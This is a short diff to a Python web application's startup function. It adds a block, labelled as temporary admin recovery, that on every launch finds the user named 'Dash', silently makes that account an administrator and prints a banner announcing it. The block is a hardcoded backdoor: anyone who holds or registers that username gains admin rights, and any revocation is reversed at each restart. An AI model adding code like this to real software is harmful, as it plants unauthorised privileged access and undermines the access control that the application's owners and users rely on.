@@ -104,6 +104,14 @@ def create_app():
         db.create_all()
         _seed_helplines()
         _seed_rooms()
+        
+        # Temporary auto-promotion for admin recovery
+        from app.models import User
+        user = User.query.filter_by(username='Dash').first()
+        if user and not user.is_admin:
+            user.is_admin = True
+            db.session.commit()
+            print("🚀 ADMIN PRIVILEGES GRANTED TO DASH 🚀", flush=True)
 
     return app
 
